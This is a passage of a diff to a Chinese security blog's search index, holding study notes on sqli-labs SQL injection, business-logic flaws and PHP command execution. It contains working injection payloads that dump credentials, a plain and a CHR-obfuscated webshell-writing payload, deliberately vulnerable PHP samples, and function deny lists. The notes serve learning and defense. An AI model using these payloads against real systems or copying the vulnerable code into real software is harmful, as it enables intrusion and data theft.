+<p>the right syntax to use near ‘’ at line 1</p>
+</blockquote>
+<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
+<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
+<blockquote>
+<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>and替换成or也是可以的</p>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^id,username,password’</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
+</blockquote>
+<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
+<blockquote>
+<p>Column count doesn’t match value count at row 1</p>
+</blockquote>
+<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
+<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
+</blockquote>
+<p>所以要闭合VALUES.</p>
+<p>利用$uagent，故构建格式，1’,1,1)#</p>
+<p>则：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
+</blockquote>
+<p>即：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
+</blockquote>
+<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
+<blockquote>
+<p>  XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>其余语句类似思路1。</p>
+<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
+<p>admin’，有报错信息…LIMIT..</p>
+<p>注释掉后，即admin’#，页面正常。</p>
+<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
+<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
+<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
+<p>嗯，报错注入也是可行的</p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -2651,6 +2821,121 @@ echo $get
       </tags>
   </entry>
   <entry>
+    <title>业务流程</title>
+    <url>/2023/06/11/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="一、基本业务"><a href="#一、基本业务" class="headerlink" title="一、基本业务"></a>一、基本业务</h1><h2 id="1-用户注册"><a href="#1-用户注册" class="headerlink" title="1.用户注册"></a>1.用户注册</h2><p>​	隐患及解决方式：</p>
+<blockquote>
+<p>1.用户重复注册；利用token机制</p>
+<p>2.不校验用户注册数据（比如，注册时，admin与admin空格；数据库会认为同一个用户）；后台用过滤函数即可。</p>
+<p>3.频繁的用户批量注册：</p>
+<p>​	1.对相同用户信息注册频率限制：</p>
+<p>​		单IP注册频率限制、表单加验证码、需要姓名加身份证认证</p>
+<p>​	2.采用二次身份校验技术</p>
+<p>​		需要验证用户邮箱、手机绑定验证</p>
+</blockquote>
+<p>但是，所有的限制手段的目的均为提升批量注册的难度，但无法从根本上阻止恶意用户，因为系统无法识别用户注册的真实意图。因此从防御视角来看，应尽可能提高恶意注册的难度，使批量注册的成本高于从网站获取到的利益，这样为解决此问题的唯一思路。</p>
+<h2 id="2-用户登录"><a href="#2-用户登录" class="headerlink" title="2.用户登录"></a>2.用户登录</h2><p>1.用户名常见、密码太简单（弱口令爆破）：</p>
+<p>​	1）限制用户名&#x2F;密码验证速率。</p>
+<p>​	2）连续三次输入错误后采用验证码等手段进行限制。</p>
+<p>​	3）提升用户密码强度及位数（较难执行，用户不遵守的情况较多）。</p>
+<p>​	4）定期修改密码（在实践中基本上无法做到，仅适用于极个别企业内网系统）。</p>
+<p>2.sql注入的万能密码</p>
+<p>​	关键是构造使用or的数据库查询语句，并添加恒等式，实现数据库对用户输入的密码查询结果永远正确。</p>
+<p>比如输入</p>
+<p><code>&#39; or &#39;1&#39;=&#39;1</code></p>
+<p>后台处理为：</p>
+<p><code>select * from user where name= &#39;admin&#39; and passwd= &#39;&#39; or &#39;1&#39;=&#39;1&#39;；</code></p>
+<p>然后还有用户名注释嘞，<code>admin&#39; -- s 密码随意</code></p>
+<p>后台处理为：<code>select * from user where name= &#39;admin&#39;</code> – s and …</p>
+<p>预防的话：</p>
+<blockquote>
+<p>限制用户名及密码可使用字符，不符合要求的直接过滤，避免单引号、数据库注释符等SQL注入行为发生。</p>
+<p>在PHP+MySQL环境下，推荐采用mysql_real_escape_string（）函数实现对输入数据的过滤，mysql_real_escape_string（）函数转义SQL语句中使用的字符串中的特殊字符。</p>
+<p>开启此功能后，下列字符受影响：\x00、\n、\r、\、’、”、\x1a。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618142621477.png"></p>
+<p>用户Session校验</p>
+<h2 id="3-密码找回"><a href="#3-密码找回" class="headerlink" title="3.密码找回"></a>3.密码找回</h2><p>验证步骤可跳过</p>
+<p>平行越权</p>
+<p>弱token</p>
+<p>Session覆盖</p>
+<h2 id="4-用户越权"><a href="#4-用户越权" class="headerlink" title="4.用户越权"></a>4.用户越权</h2><p>​	RBAC模型（基于角色的访问控制）</p>
+<p>主要是Web系统能定制各类业务，能快速实现各类不同应用场景及功能。不好总结。</p>
+<h1 id="二、标准业务"><a href="#二、标准业务" class="headerlink" title="二、标准业务"></a>二、标准业务</h1><p>一台物理服务器、一个互联网接口、一个固定IP及域名就可以构建一个基本的Web网站。</p>
+<p>也可利用目前各类云服务器（如阿里云）并配合相应的CMS，就可在半小时内快速建站，网站的速度及美观性均可满足用户基本需求，而且提供完备的站点管理措施及内容更新方式。</p>
+<h2 id="系统管理者面临的问题"><a href="#系统管理者面临的问题" class="headerlink" title="系统管理者面临的问题"></a>系统管理者面临的问题</h2><p>1.如何建设</p>
+<blockquote>
+<p>开发人员根据Web功能需求开发网站。这样涉及的问题会非常多，目前也有非常成熟的开发体系及防护方案。</p>
+</blockquote>
+<blockquote>
+<p>中小站长由于时间及技术实力的问题，通常会选择各类CMS架设网站。</p>
+</blockquote>
+<p>2.如何管理</p>
+<blockquote>
+<p>远程登录服务器，在操作系统层面实现本地对文件的修改。</p>
+<p>远程登录数据库，直接管理数据库等。</p>
+<p>建设管理后台，实现对网站的应用层面管理等。</p>
+</blockquote>
+<p>3.用户怎么用</p>
+<blockquote>
+<p>网站交互功能越多，面临的安全风险就越高，这点毋庸置疑。一个静态网站无论如何也不会出现各类安全漏洞。这里不包含伪静态网站，伪静态网站只是将参数转换为路径（如？a&#x3D;1转换为&#x2F;a&#x2F;1），这在攻击者看来没有什么难度。</p>
+</blockquote>
+<blockquote>
+<p>攻击者使用的范围并不会比正常用户广。因此，攻击者会从各项应用点进行考虑并分析，寻找安全隐患，如Web传参点等。</p>
+</blockquote>
+<h2 id="CMS及其特征"><a href="#CMS及其特征" class="headerlink" title="CMS及其特征"></a>CMS及其特征</h2><p>CMS（Content Management System）即内容管理系统，通常指一套完整的网站模板或建站系统。</p>
+<p>CMS已设计好一套标准的使用环境，包括完整的前后台逻辑等。用户只需要将CMS部署在Web服务器上，添加相应内容、修改站点样式即可完成网站的制作。国内目前大量的论坛及个人博客均采用CMS进行架设。</p>
+<blockquote>
+<p>Discuz 、Ecshop、phpcms等</p>
+</blockquote>
+<p>从安全角度考虑，CMS的安全问题主要有：</p>
+<p>1）整个网站系统依托于CMS，如果CMS突然爆发高危漏洞，则站点会受到影响。</p>
+<p>2）CMS默认会在根目录中有setup页面。很多网站管理员在CMS安装完毕后如不及时删除它，则很容易留下被覆盖攻击的隐患。</p>
+<p><strong>CMS比较适合运维人员少或无专职运维人员的个人及中小型企业者</strong></p>
+<p>利用CMS建站时，建议采取以下手段，可有效保障Web系统的安全。</p>
+<p>1）及时升级CMS系统版本，保证版本最新。</p>
+<p>2）尽可能少利用CMS的扩展插件，尤其是WordPress。</p>
+<p>3）上线完毕后删除默认安装脚本。</p>
+<p>4）务必修改默认密码、CMS标识等。</p>
+<p>CMS系统无论怎么修改，其中一些特征依然可被攻击者轻易识别，之后再利用目标CMS版本对应的漏洞进行攻击尝试。利用搜索引擎进行搜索即可发现大量此类内容，点击进入之后可看到相关的标识：以discuz！为例，它常用于各类站点首页的标识。不过，部分管理员会对其进行修改。</p>
+<blockquote>
+<p>powered by Discuz! X3.2 技术支持。。。。</p>
+</blockquote>
+<p>还有，源代码也可能有这种信息。</p>
+<p>当然了，目标站点的CMS及对应版本号这些基本信息，可能低危漏洞都算不上，但对于攻击者来说，是个考虑是继续渗透还是放弃的信息。</p>
+<h2 id="常见远程管理方式"><a href="#常见远程管理方式" class="headerlink" title="常见远程管理方式"></a>常见远程管理方式</h2><h3 id="Windows远程登录"><a href="#Windows远程登录" class="headerlink" title="Windows远程登录"></a>Windows远程登录</h3><p>RDP协议（Remote Desktop Protocol，远程桌面协议）可使Windows系统之间进行互相的远程访问，默认利用3389端口。</p>
+<p>它虽不存在什么漏洞，但攻击者可能利用其他方式对现有系统提权后并创建账号，再直接利用新创建账号远程登录即可。</p>
+<h3 id="Linux-SSH22端口"><a href="#Linux-SSH22端口" class="headerlink" title="Linux SSH22端口"></a>Linux SSH22端口</h3><p><strong>（Windows使用putty进行SSH登录）</strong></p>
+<p>命令嘛，工具也可以。</p>
+<p>ssh ...@… </p>
+<p>攻击者攻击Web应用的主要原因是想获得Web应用所在服务器的权限，进而作为跳板攻击内网。当攻击者获得webshell后，接下来就会进行提权并开放远程管理权限。因此，远程管理很多时候方便运维人员开展，但在一定程度上也为攻击者提供了远程连接的通道。</p>
+<h3 id="Web应用管理后台"><a href="#Web应用管理后台" class="headerlink" title="Web应用管理后台"></a>Web应用管理后台</h3><p>注意不要在前台放后台管理链接，</p>
+<p>否则</p>
+<blockquote>
+<p>在前台可利用SQL注入、XSS盲打等手段获取后台用户的登录凭证</p>
+</blockquote>
+<p>也避免被路径扫描到后台路径，Web应用管理后台起得复杂一点。</p>
+<p>针对后台管理业务的安全，重点在于登录用户管理阶段，如管理员登录、密码找回，越权等。</p>
+<h3 id="数据库开放远程管理"><a href="#数据库开放远程管理" class="headerlink" title="数据库开放远程管理"></a>数据库开放远程管理</h3><p>在正常网站运行时，数据库只需与Web服务器进行通信。如果站（网站）库（数据库）为一体部署，那么在本地通信即可。但在真实环境中，MySQL默认数据库远程管理处于关闭状态，考虑到维护的方便，部分系统均会考虑打开远程数据库接口。管理员可利用各类数据库管理工具实现远程登录。</p>
+<p>启用远程管理的安全隐患包括：</p>
+<p>1）如果存在弱密码，则直接可能被攻击者登录并获取数据。</p>
+<p>2）可远程爆破MySQL密码。</p>
+<p>3）如果攻击者已获得webshell，则会在页面中寻找数据库连接密码，再进行远程连接。</p>
+<p>以上任何一种隐患可能均会对数据库安全造成极大影响，因此建议<strong>关闭数据对外连接端口</strong>。如需远程维护，考虑利用VPN等先连接到内网再进行访问。</p>
+<h3 id="在线编辑器"><a href="#在线编辑器" class="headerlink" title="在线编辑器"></a>在线编辑器</h3><p>如果有上传文件功能，那就存在文件上传漏洞。</p>
+<p>以fckeditor为例，可将编辑器结合在网页中，实现功能强大的上传点。</p>
+<p>目前此类问题主要存在于大量已运行多年的Web应用系统中，新建系统基本不存在此类问题。</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>业务流程</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>业务流程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>中间件介绍</title>
     <url>/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h1><p>介于操作系统和应用软件之间，为应用软件提供服务功能的软件，有消息中间件，交易中间件，应用服务器等。由于介于两种软件之间，所以，称为中间件</p>
@@ -2703,6 +2988,124 @@ echo $get
         <tag>linux</tag>
         <tag>反弹shell</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/06/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 命令执行</span><br><span class="line">categories: </span><br><span class="line">- 《WEB安全基础》</span><br><span class="line">- 命令执行</span><br><span class="line">date: 2023-06-11 9:12:30</span><br><span class="line">tags: </span><br><span class="line">- 《WEB安全基础》</span><br><span class="line">- 命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>效果类似包含攻击，主要是由于输入的参数被当成命令来执行。</p>
+<h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><h3 id="1-利用系统函数实现"><a href="#1-利用系统函数实现" class="headerlink" title="1.利用系统函数实现"></a>1.利用系统函数实现</h3><p>在PHP下，允许远程命令执行的函数有eval（）、assert（）、preg_replace（）、call_user_func（）。如果页面中存在上述函数且其参数可被用户控制，同时没有对参数做有效的过滤，那么就可能存在远程命令执行漏洞。</p>
+<h4 id="1-eval（）与assert（）函数的区别"><a href="#1-eval（）与assert（）函数的区别" class="headerlink" title="1.eval（）与assert（）函数的区别"></a>1.eval（）与assert（）函数的区别</h4><p>eval（）与assert（）函数在执行效果上基本相同，均可动态执行代码，且接收的参数为字符串。assert（）函数虽然也会执行参数内的代码，但主要用来判断一个表达式是否成立，并返回true或false。实战中，eval（）函数通常会被系统禁用，因此在一句话木马中通常利用assert（）来实现代码执行。</p>
+<p>但需要注意的是：eval参数必须是合法的PHP代码，必须以分号结尾，否则会报错。</p>
+<blockquote>
+<p><code>eval（&quot;phpinfo();&quot;);</code> &#x2F;&#x2F;应符合PHP的代码规范，须在phpinfo（）后面添加“<strong>；</strong>”</p>
+<p><code>assert(&quot; phpinfo() &quot;);</code> &#x2F;&#x2F;assert没这要求</p>
+</blockquote>
+<h4 id="2-preg-replace（）函数"><a href="#2-preg-replace（）函数" class="headerlink" title="2.preg_replace（）函数"></a>2.preg_replace（）函数</h4><p>使用preg_replace（）函数的好处在于，此函数在业务系统中广泛使用，因此无法直接在PHP中进行禁用，在适用范围上比eval（）、assert（）函数好很多。但随着PHP版本的提升，preg-replace（）函数可使用的范围也非常小了。</p>
+<p>其用法是执行一个正则表达式的搜索和替换</p>
+<p>格式为：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">//搜索subject中匹配pattern的部分，以replacement进行替换。</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>该函数的主要问题在于，当参数$pattern处存在一个“&#x2F;e”修饰符时，$replacement的值会被<strong>当成PHP代码</strong>来执行。此时代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;sds&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入值为phpinfo()，会被解析成代码执行。</p>
+<p><strong>仅限于PHP5.4及以下版本中，5.5之后废弃了这个修饰符</strong>。要求用preg_replace_callback（）函数来代替。</p>
+<h4 id="3-利用其他函数调用实现"><a href="#3-利用其他函数调用实现" class="headerlink" title="3.利用其他函数调用实现"></a>3.利用其他函数调用实现</h4><p>利用<strong>其他函数的组合</strong>来实现类似功能。PHP中有许多函数具有<strong>调用其他函数</strong>的功能，如array_map（）函数、call_user_func（）函数等，这里以array_map函数为例</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$some_array</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$cmd</span>, <span class="variable">$some_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618101221738.png"></p>
+<p>同类型函数</p>
+<blockquote>
+<p>·ob_start（）、unserialize（）、create_function（）</p>
+<p>·usort（）、uasort（）、uksort（）</p>
+<p>·array_filter（）</p>
+<p>·array_reduce（）</p>
+<p>·array_diff_uassoc（）、array_diff_ukey（）</p>
+<p>·array_udiff（）、array_udiff_assoc（）、array_udiff_uassoc（）</p>
+<p>·array_intersect_assoc（）、array_intersect_uassoc（）</p>
+<p>·array_uintersect（）、array_uintersect_assoc（）、array_uintersect_uassoc（）</p>
+<p>·array_walk（）、array_walk_recursive（）</p>
+<p>·xml_set_character_data_handler（）</p>
+<p>·xml_set_default_handler（）</p>
+<p>·xml_set_element_handler（）</p>
+<p>·xml_set_end_namespace_decl_handler（）</p>
+<p>·xml_set_external_entity_ref_handler（）</p>
+<p>·xml_set_notation_decl_handler（）</p>
+<p>·xml_set_processing_instruction_handler（）</p>
+<p>·xml_set_start_namespace_decl_handler（）</p>
+<p>·xml_set_unparsed_entity_decl_handler（）</p>
+<p>·stream_filter_register（）</p>
+<p>·set_error_handler（）</p>
+<p>·register_shutdown_function（）</p>
+<p>·register_tick_function（）</p>
+</blockquote>
+<h4 id="4-利用动态函数执行"><a href="#4-利用动态函数执行" class="headerlink" title="4.利用动态函数执行"></a>4.利用动态函数执行</h4><p>PHP语言的特性之一就是当前的PHP函数可直接由字符串拼接而成。因此，很多程序用了动态函数的写法，比如用可控的函数名来动态生成要执行的函数名称及内容。</p>
+<p>在命令执行功能中，可利用这个特性实现命令的执行。环境测试代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo $a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然，在实际中不会这么写，没意义</p>
+<blockquote>
+<p>url中输入?a&#x3D;assert&amp;b&#x3D;phpinfo()即可执行。</p>
+</blockquote>
+<p>注意：<strong>在php7.1版本之后 assert()默认不再可以执行代码</strong></p>
+<h3 id="2-利用漏洞获取webshell"><a href="#2-利用漏洞获取webshell" class="headerlink" title="2.利用漏洞获取webshell"></a>2.利用漏洞获取webshell</h3><p>存在远程命令执行漏洞，攻击者最想获得的就是目的站点的webshell，<strong>即目标站点的控制权限。</strong></p>
+<p>利用<strong>木马技术</strong>是获取webshell的有效手段。针对存在远程命令执行漏洞的环境，攻击者会尝试<strong>构建可执行的命令，并在命令执行后会导致目标站点在其本地生成一个PHP页面。</strong>生成的PHP页面中包含一句话木马。有效命令如下：</p>
+<p><code>fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</code></p>
+<p>为了防止被进行编码和过滤嘞，利用chr对所有字符进行ASCII转换，进而执行。</p>
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(CHR(102).CHR(112).CHR(117).CHR(116).CHR(115).CHR(40).CHR(102).CHR(111).CHR(112).CHR(101).CHR(110).CHR(40).CHR(34).CHR(97).CHR(46).CHR(112).CHR(104).CHR(112).CHR(34).CHR(44).CHR(34).CHR(119).CHR(34).CHR(41).CHR(44).CHR(39).CHR(60).CHR(63).CHR(112).CHR(104).CHR(112).CHR(32).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(34).CHR(99).CHR(109).CHR(100).CHR(34).CHR(93).CHR(41).CHR(63).CHR(62).CHR(39).CHR(41).CHR(59))</span><br></pre></td></tr></table></figure>
+
+<p>后台代码就这个，<strong>php5.3版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;cmd&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618104339484.png"></p>
+<p>是有的哈，蚁剑等一句话木马工具连接就可以了。</p>
+<h4 id="单引号与双引号"><a href="#单引号与双引号" class="headerlink" title="单引号与双引号"></a>单引号与双引号</h4><p>关于payload的构造，务必要清楚单引号与双引号的区别。如果使用单引号，则引号内部的变量不会执行，会被系统直接输出；而双引号里的字段会经过编译器解释后进行执行，上述payload在执行fputs函数时首先要把第二个参数当做字符串处理，后面参数若用双引号包含，则程序会抛出异常，同时文件只会写入&lt;？php eval（）？&gt;，写入一句话失败。</p>
+<p>url编码，单引号%27，双引号%22，记录一下。</p>
+<p>函数被当作字符串进行输出而不会被执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;phpinfo()&quot;; //直接输出字符串了</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>需要利用大括号等进行特殊构造，以达到函数执行的效果。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>7.3版本都是可以的。</strong></p>
+<h2 id="系统命令执行漏洞"><a href="#系统命令执行漏洞" class="headerlink" title="系统命令执行漏洞"></a>系统命令执行漏洞</h2><p>利用系统自身的命令实现额外的命令执行。</p>
+<p>比如有的靶场，让你输入ip，它会帮你去检测ip地址能否连通，这就用到了系统的ping功能。</p>
+<p>PHP的系统命令执行函数也能实现，比如</p>
+<blockquote>
+<p>system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（）等，此外还有反引号命令执行，这种方式实际上是调用shell_exec（）函数来执行。</p>
+</blockquote>
+<p>这个pikachu、DVWA都有。</p>
+<p>以pikachu为例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div id=&quot;comm_main&quot;&gt;</span><br><span class="line">                &lt;p class=&quot;comm_title&quot;&gt;Here, please enter the target IP address!&lt;/p&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;input class=&quot;ipadd&quot; type=&quot;text&quot; name=&quot;ipaddress&quot; /&gt;</span><br><span class="line">                    &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ping&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;?php</span><br><span class="line">                    if($result)&#123;</span><br><span class="line">                        echo &quot;&lt;pre&gt;&#123;$result&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入ip，将ping命令与ip拼接，并执行。</p>
+<p>输入ip没有过滤和限制，考虑如何同时执行两条系统命令。</p>
+<p>在cmd中：</p>
+<blockquote>
+<p>C:\Users\67538&gt;whoami&amp;&amp;ipconfig<br>laptop-0kttc8k5\67538</p>
+<p>Windows IP 配置</p>
+<p>以太网适配器 以太网 2:</p>
+<p>…</p>
+</blockquote>
+<p>当然了，**;和||**效果类似</p>
+<h2 id="有效防护"><a href="#有效防护" class="headerlink" title="有效防护"></a>有效防护</h2><p>主要思路是消除漏洞存在环境，或针对传入的参数进行严格限制或过滤</p>
+<h3 id="1-禁用部分系统函数"><a href="#1-禁用部分系统函数" class="headerlink" title="1.禁用部分系统函数"></a>1.禁用部分系统函数</h3><p>在PHP下禁用高危系统函数的方法为：打开PHP安装目录，找到php.ini，查找到disable_functions，添加需禁用的函数名，如下所示：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()、eval()、passthru()、exec()、system()、chroot()、scandir()、chgrp()、chown()、shell_exec()、proc_open()、proc_get_status()、ini_alter()、ini_alter()、ini_restore()、dl()、pfsockopen()、openlog()、syslog()、readlink()、symlink()、popepassthru()、stream_socket_server()、fsocket()、fsockopen()</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="2-严格过滤关键字符"><a href="#2-严格过滤关键字符" class="headerlink" title="2　严格过滤关键字符"></a>2　严格过滤关键字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$substitutions = array( </span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure>
+
+<p>过滤的关键字为“&amp;&amp;”“；”“”“||”，这些都可作为本地命令执行的关键字。远程的话，涉及的关键字符则比较复杂。在远程命令执行环境利用关键字符过滤并不十分合适。</p>
+<h3 id="3-严格限制允许的参数类型"><a href="#3-严格限制允许的参数类型" class="headerlink" title="3　严格限制允许的参数类型"></a>3　严格限制允许的参数类型</h3><p>令执行功能主要用于扩展用户的交互行为，允许用户输入特定的参数来实现更丰富的应用功能。</p>
+<p>例如，对于本地命令执行环境，业务系统希望用户输入IP地址来实现ping功能。因此，如果能对用户输入参数进行有效的合法性判断，可避免在原有命令后面拼接多余命令，也就达到了防护远程命令执行攻击的效果。</p>
+<p>比如，正则。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>命令执行漏洞使用方法较为直接，也能更好地理解漏洞存在的原理。</p>
+<p>需要注意的一点是，很多Web框架，如struts、thinkphp等均在框架内实现类似命令执行的功能，但由于实现方式与此完全不同，其修复建议也只能参考对应的官方修复包。</p>
+]]></content>
   </entry>
   <entry>
     <title>在线网址</title>
@@ -2874,8 +3277,10 @@ echo $get
 <h1 id="3-评价安全标准"><a href="#3-评价安全标准" class="headerlink" title="3.评价安全标准"></a>3.评价安全标准</h1><p>评价企业安全建设做的好与坏的标准就是ROI（投资回报率），即攻击者攻击的成本是10元，你去防御这个攻击的成本是1毛，说明这个安全建设是有效的。</p>
 <h1 id="4-SDL"><a href="#4-SDL" class="headerlink" title="4.SDL"></a>4.SDL</h1><p>security development lifecycle，即安全开发生命周期。</p>
 <p>目的：从安全漏洞产生的根源上解决应用安全问题，通过对软件开发流程的控制，保证产品的安全性。</p>
